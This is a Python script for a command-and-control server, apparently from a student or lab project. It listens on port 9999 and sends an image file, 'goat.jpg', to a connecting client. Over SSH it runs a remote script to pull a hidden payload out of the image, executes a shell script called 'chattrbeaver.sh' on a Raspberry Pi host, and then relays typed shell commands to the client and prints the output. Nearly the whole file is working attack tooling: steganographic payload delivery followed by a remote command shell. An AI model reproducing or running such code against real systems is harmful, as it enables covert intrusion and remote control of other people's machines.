import socket
import sys
import os
FILE_SENT = True

#Creating a socket.
def create_socket():
        try:
                global host
                global port
                global sock
                host = ""
                port = 9999
                sock = socket.socket()

        except socket.error as msg:
                print("Socket creation error: " + str(msg))

#Binding the socket and listening for connections
def bind_socket():
        try:
                global host
                global port
                global sock

                print("Binding Port: " + str(port))

                sock.bind((host, port))
                sock.listen(5)

        except socket.error as msg:
                print("Binding socket error " + str(msg) + "\n" + "Retrying....")
                bind_socket()

# Establish a connection with a client (socket must be listening)
def socket_accept(restart):
        conn, addr = sock.accept()
        print("Connection has been established! |" + " IP " + addr[0] + " | Port: " + str(addr[1]))
        if not restart:
                send_file(conn, addr)
        else:
                send_commands(conn)
        conn.close()

# Send file to connected clients
def send_file(conn, addr):
        filename = "goat.jpg"
        print("File Server started...")
        while True:
                print(f"Accepted the connection from {addr[0]}")
                data = conn.recv(1024)
                print(f"Server received {data}")
                with open(filename,"rb") as file:
                        data = file.read(1024)
                        while data:
                                conn.send(data)
                                print("f{data!r}")
                                data = file.read(1024)
                print("File sent complete!")
                print("File Server closing...")
                conn.close()
                if(FILE_SENT):
                        break
        sock.close()
        extract_file()

#Extracting file from image
def extract_file():
    os.system("ssh pi@192.168.3.2 python3 -u - -g goat.jpg 3 < imagehide-remote.py")
    os.system("ssh pi@192.168.3.2 chmod +x chattrbeaver.sh")
    os.system("ssh pi@192.168.3.2 bash chattrbeaver.sh")
    restart_socket()

#Restarting socket
def restart_socket():
        print("Connection is restarting...")
        restart = 1
        create_socket()
        bind_socket()
        socket_accept(restart)

# Send command to connected clients
def send_commands(conn):
        while True:
                cmd = input()
                if cmd == 'quit':
                        conn.close()
                        sock.close()
                        sys.exit()
                if len(str.encode(cmd)) > 0:
                        conn.send(str.encode(cmd))
                        client_response = str(conn.recv(1024), "utf-8")
                        print(client_response, end="")

def main():
        restart = 0
        create_socket()
        bind_socket()
        socket_accept(restart)

main()
